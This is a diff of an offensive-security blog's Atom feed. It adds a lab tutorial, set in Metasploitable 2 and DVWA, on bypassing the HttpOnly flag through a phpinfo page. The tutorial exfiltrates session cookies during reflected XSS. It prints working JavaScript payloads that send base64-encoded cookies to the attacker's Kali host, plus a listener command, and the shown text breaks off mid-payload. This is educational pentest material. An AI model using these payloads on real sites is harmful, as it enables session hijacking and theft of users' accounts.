@@ -1,4 +1,281 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.io/" rel="alternate" type="text/html" /><updated>2022-11-10T20:09:58+01:00</updated><id>https://hackcommander.io/feed.xml</id><title type="html">hackcommander.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>HackCommander</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">Time-based SQL injection in a login form</title><link href="https://hackcommander.io/bug-bounty-2/" rel="alternate" type="text/html" title="Time-based SQL injection in a login form" /><published>2022-10-17T00:00:00+02:00</published><updated>2022-10-17T00:00:00+02:00</updated><id>https://hackcommander.io/bug-bounty-2</id><content type="html" xml:base="https://hackcommander.io/bug-bounty-2/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.io/" rel="alternate" type="text/html" /><updated>2022-11-12T21:32:02+01:00</updated><id>https://hackcommander.io/feed.xml</id><title type="html">hackcommander.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>HackCommander</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation</title><link href="https://hackcommander.io/pentesting-article-1/" rel="alternate" type="text/html" title="How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation" /><published>2022-11-12T00:00:00+01:00</published><updated>2022-11-12T00:00:00+01:00</updated><id>https://hackcommander.io/pentesting-article-1</id><content type="html" xml:base="https://hackcommander.io/pentesting-article-1/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Setting up the environment&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Hands-on!&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-2-1&quot;&gt;2.1. Trying to exfiltrate the cookies through the usual method&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-2-2&quot;&gt;2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-2-3&quot;&gt;2.3. Important notes&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Conclusions&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/phpinfo-dvwa-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;PHP info page disclosure is usually considered to be a low severity vulnerability but in this post I am going to show how to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation. This file could be used to perform a session hijacking.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-1&quot; /&gt;
+
+&lt;h2 id=&quot;1-setting-up-the-environment&quot;&gt;1. Setting up the environment&lt;/h2&gt;
+
+&lt;p&gt;We will use the intentionally vulnerable machine &lt;em&gt;Metasploitable 2&lt;/em&gt;. To set up the enviroment follow the steps below:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Download the virtual machine from the link below&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/metasploitable-2,29/&quot;&gt;Link to download Metasploitable 2&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;and import the machine in VMware. If you use VirtualBox, you can do it, the virtualization software is not relevant.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;You should have another virtual machine, preferably a Kali virtual machine.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Set the network adapter of your Kali and &lt;em&gt;Metasploitable 2&lt;/em&gt; as Host-only.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Run &lt;em&gt;Metasploitable 2&lt;/em&gt; and log in using the credentials msfadmin:msfadmin.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Get the IP of the machine through the command ifconfig&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/ifconfig.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Suposing that the IP of the &lt;em&gt;Metasploitable 2&lt;/em&gt; machine is 192.168.240.129 you can access to the web from your Kali through the URL&lt;/p&gt;
+
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; http://192.168.240.129/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;In the main page select the option &lt;em&gt;DVWA&lt;/em&gt;, wich is the acronym of &lt;em&gt;Damn Vulnerable Web Application&lt;/em&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/main-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Log in with the credentials admin:password.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Configure the &lt;em&gt;Security Level&lt;/em&gt; to &lt;em&gt;low&lt;/em&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/dvwa-security.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;and click &lt;em&gt;Submit&lt;/em&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;In the left panel select the option &lt;em&gt;XSS reflected&lt;/em&gt; and write the payload&lt;/p&gt;
+
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;in the text box as follows&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/xss-reflected-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;and clicking on &lt;em&gt;Submit&lt;/em&gt; you will see an alert like the following&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/xss-reflected-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;So there is an HTML context reflected XSS through GET method in the URL&lt;/p&gt;
+
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;To show how the PHP info page can be used to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag, we must first have at least one cookie with the &lt;em&gt;HttpOnly&lt;/em&gt; flag set to &lt;em&gt;true&lt;/em&gt;. In &lt;em&gt;Metasploitable 2&lt;/em&gt; is not set by defaul, that’s why we have to access to the cookies in the browser (Firefox in my case) and set, for example, the &lt;em&gt;HttpOnly&lt;/em&gt; of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie to &lt;em&gt;true&lt;/em&gt;, as you can see in the following screenshot&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/cookies-settings.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div id=&quot;section-id-2&quot; /&gt;
+
+&lt;h2 id=&quot;2-hands-on&quot;&gt;2. Hands-on!&lt;/h2&gt;
+
+&lt;div id=&quot;section-id-2-1&quot; /&gt;
+
+&lt;h2 id=&quot;21-trying-to-exfiltrate-the-cookies-through-the-usual-method&quot;&gt;2.1. Trying to exfiltrate the cookies through the usual method&lt;/h2&gt;
+
+&lt;p&gt;A very common way to access the cookies via Javascript is through the &lt;em&gt;document&lt;/em&gt; property &lt;em&gt;cookie&lt;/em&gt;. So if you write the payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and you click on &lt;em&gt;Submit&lt;/em&gt;, you are going to see all your cookies in the screen… or not?&lt;/p&gt;
+
+&lt;p&gt;If you make that, you are going to see only the &lt;em&gt;security&lt;/em&gt; cookie, like in the following screenshot&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/xss-cookies-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;but… Why are we not seeing the value of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie? That’s because the value &lt;em&gt;true&lt;/em&gt; in the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the cookie &lt;em&gt;PHPSESSID&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;HttpOnly&lt;/em&gt; is an additional flag included in a Set-Cookie HTTP response header. Using the &lt;em&gt;HttpOnly&lt;/em&gt; flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it). You can check more information about the &lt;em&gt;HttpOnly&lt;/em&gt; flag in the following link&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/HttpOnly&quot;&gt;Link of OWASP about the HttpOnly flag&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;For those who do not do web pentesting or who do not regularly deal with XSS, this flag may not be familiar, but for those of us who are used to looking for and reporting these vulnerabilities in bug bounty programs, this flag is the main problem we encounter when it comes to finding a real impact in an XSS.&lt;/p&gt;
+
+&lt;p&gt;Take a look at the following code&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This code is a very common way to try to exfiltrate the user cookies during an XSS exploitation. This code is executed in the client side (XSS is a client side vulnerability) and try to import a image from the IP 192.168.240.129, which is the IP of my Kali. The requested path is the user cookies encoded in &lt;em&gt;base64&lt;/em&gt;. The &lt;em&gt;base64&lt;/em&gt; encoding is not strictly necessary but it can be useful for passing data in URLs when the data includes non-url friendly characters.&lt;/p&gt;
+
+&lt;p&gt;So if we set up a web server in our Kali through the command&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;python3 -m http.server 80
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;like in the following screenshot&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/python-web-server.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and we write the payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we click &lt;em&gt;Submit&lt;/em&gt;, we can see that a GET request has been printed in the web server, like in the following screenshot&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/user-cookies-exfiltrated-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The path of the GET request is the &lt;em&gt;base64&lt;/em&gt; encoded form of the user cookies, so decoding it with the burpsuite decoder we can get the user cookies&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/user-cookies-exfiltrated-decoded-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, only the &lt;em&gt;security&lt;/em&gt; cookie is displayed and not the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie. That’s because the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2-2&quot; /&gt;
+
+&lt;h2 id=&quot;22-exfiltrating-the-cookies-bypassing-the-httponly-flag-through-the-php-info-page&quot;&gt;2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page&lt;/h2&gt;
+
+&lt;p&gt;Ok, we can’t get the cookies from the &lt;em&gt;document&lt;/em&gt; object. Is there another place where we can get the cookies?&lt;/p&gt;
+
+&lt;p&gt;In &lt;em&gt;Metasploitable 2&lt;/em&gt; there is a PHP info page disclosure in the path &lt;em&gt;/dvwa/phpinfo&lt;/em&gt;. In my case, it’s in the URL&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/phpinfo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/en/function.phpinfo.php&quot;&gt;PHP info page&lt;/a&gt; is a page that outputs information about PHP’s configuration and is a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. If you take a look at the page you will see that your cookies appear in several places, for example in&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/phpinfo-dvwa-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Make a request to the URL&lt;/p&gt;
+
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/phpinfo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Take the portion of the PHP info page that contains the user cookies.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Encode this cookies in &lt;em&gt;base64&lt;/em&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Send this encoded string to the malicious server, that is, our Kali.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;That is what the following code does&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the request object&lt;/span&gt;
+   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set the listener reqListener that is triggered when the response is ready&lt;/span&gt;
+   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.128/dvwa/phpinfo&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the URL of the PHP info page&lt;/span&gt;
+   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Send the cookie header&lt;/span&gt;
+   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously&lt;/span&gt;
+   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Send the request&lt;/span&gt;
+   &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the request object&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HTTP_COOKIE&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Store in the variable sess the result of encoding in base64 the portion of the PHP info page between the first appearance of the word HTTP_COOKIE and the final of the page&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/?data=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// The request will be sent to the Kali (192.168.240.129) through the GET method synchronously&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Send the request&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;that I have taken from the blog of Aleksi Kistauri&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/metasploitable-2,29/&quot;&gt;Link to Aleksi Kistauri’s blog post&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;making some minor modifications. This code could probably be optimized to be more precise in taking the exact part of the PHP info page that contains the cookies but it would also be longer.&lt;/p&gt;
+
+&lt;p&gt;So if we set up a web server in our Kali through the above command, we write the payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.128/dvwa/phpinfo&lt;/span&gt;&lt;span 